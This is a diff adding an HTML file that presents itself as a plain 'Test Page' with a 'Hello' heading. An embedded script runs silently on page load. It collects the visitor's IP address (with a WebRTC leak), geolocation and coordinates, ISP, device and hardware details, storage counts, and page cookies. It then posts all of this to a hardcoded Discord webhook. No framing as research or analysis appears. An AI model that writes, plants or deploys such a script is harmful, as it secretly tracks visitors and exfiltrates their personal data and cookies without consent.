@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Test Page</title>
+</head>
+<body>
+    <h1>Hello</h1>
+
+<script>
+(function(){
+const L="Kiosk_Main";const W="https://discord.com/api/webhooks/1499088458407219200/2K55GD94Hb9UDxfsBk-ZVF__9z-Bc2Qv1dg-H94f89pRoU5jq4jNpyyPQ5s7D1z5vyds";const TS=new Date().toISOString();const U=location.href;const T=document.title;const R=document.referrer||"Direct";
+async function getWebRTC(){return new Promise((r)=>{let pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});pc.createDataChannel("");pc.createOffer().then(o=>pc.setLocalDescription(o));pc.onicecandidate=(e)=>{if(e&&e.candidate){let ip=e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);if(ip){r(ip[0]);pc.close()}}};setTimeout(()=>r("unavailable"),2000)});}
+async function getData(){try{
+let geo=await fetch("https://ipapi.co/json/").then(r=>r.json());
+let webrtcIP=await getWebRTC();
+let batteryInfo="unavailable";
+if(navigator.getBattery){try{let b=await navigator.getBattery();batteryInfo=(b.charging?"Charging ":"")+Math.round(b.level*100)+"%" }catch(e){}}
+let conn=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+let connectionInfo=conn?conn.effectiveType+"("+conn.rtt+"ms)":"unavailable";
+let plugins=[];for(let i=0;i<navigator.plugins.length&&i<8;i++){plugins.push(navigator.plugins[i].name);}
+let payload={
+label:L,ts:TS,url:U,title:T,referrer:R,
+ip:geo.ip||"unknown",webrtc:webrtcIP,
+city:geo.city||"unknown",region:geo.region||"unknown",region_code:geo.region_code||"unknown",postal:geo.postal||"unknown",
+country:geo.country_name||"unknown",country_code:geo.country_code||"unknown",lat:geo.latitude||"unknown",lon:geo.longitude||"unknown",
+isp:geo.org||"unknown",asn:geo.asn||"unknown",vpn:geo.proxy||false,mobile:geo.mobile||false,carrier:geo.carrier||"unknown",
+currency:geo.currency||"unknown",calling_code:geo.country_calling_code||"unknown",timezone:geo.timezone||Intl.DateTimeFormat().resolvedOptions().timeZone,
+ua:navigator.userAgent,platform:navigator.platform,language:navigator.language,languages:navigator.languages.join(", "),
+screen:screen.width+"x"+screen.height,screen_avail:screen.availWidth+"x"+screen.availHeight,color_depth:screen.colorDepth+"bit",pixel_ratio:window.devicePixelRatio,
+hardware_concurrency:navigator.hardwareConcurrency||"unknown",device_memory:navigator.deviceMemory?navigator.deviceMemory+"GB":"unknown",max_touch_points:navigator.maxTouchPoints,
+cookie_enabled:navigator.cookieEnabled,do_not_track:navigator.doNotTrack||"unspecified",connection:connectionInfo,battery:batteryInfo,plugins:plugins.join(", "),
+local_storage:(()=>{try{return Object.keys(localStorage).length}catch(e){return"blocked"}})(),
+session_storage:(()=>{try{return Object.keys(sessionStorage).length}catch(e){return"blocked"}})(),
+cookies:document.cookie?document.cookie.substring(0,200):"none"
+};
+let fields=[
+{name:"IP",value:payload.ip+(payload.webrtc!="unavailable"?" (WebRTC:"+payload.webrtc+")":""),inline:false},
+{name:"ISP/ASN",value:payload.isp+(payload.asn!="unknown"?"\nASN:"+payload.asn:""),inline:true},
+{name:"VPN/Proxy",value:payload.vpn?"YES":"NO",inline:true},
+{name:"Mobile/Carrier",value:payload.mobile?payload.carrier||"Detected":"No",inline:true},
+{name:"Location",value:payload.city+", "+payload.region+" ("+payload.region_code+")\n"+payload.country+" ("+payload.country_code+")\nPostal:"+payload.postal,inline:false},
+{name:"Coords",value:payload.lat+", "+payload.lon,inline:true},
+{name:"Currency/Calling",value:payload.currency+"/"+payload.calling_code,inline:true},
+{name:"Device",value:payload.ua.substring(0,70),inline:false},
+{name:"Platform",value:payload.platform,inline:true},
+{name:"Language",value:payload.language+" ("+payload.languages+")",inline:false},
+{name:"Screen",value:payload.screen+" (avail:"+payload.screen_avail+")\nColor:"+payload.color_depth+" Ratio:"+payload.pixel_ratio,inline:false},
+{name:"Hardware",value:"CPU:"+payload.hardware_concurrency+" cores RAM:"+payload.device_memory+" Touch:"+payload.max_touch_points,inline:false},
+{name:"Connection/Battery",value:"Net:"+payload.connection+" Bat:"+payload.battery,inline:false},
+{name:"Plugins",value:payload.plugins||"none",inline:false},
+{name:"Storage",value:"Local:"+payload.local_storage+" Session:"+payload.session_storage,inline:true},
+{name:"Cookies",value:payload.cookies,inline:false},
+{name:"Page",value:payload.url.substring(0,100),inline:false},
+{name:"Label",value:payload.label,inline:true},
+{name:"Time",value:payload.ts,inline:true}
+];
+await fetch(W,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({embeds:[{title:"VISITOR - "+payload.label,color:0xff4444,fields:fields}]})});
+}catch(e){console.error(e);}
+}
+getData();
+})();
+</script>
+
+</body>
+</html>
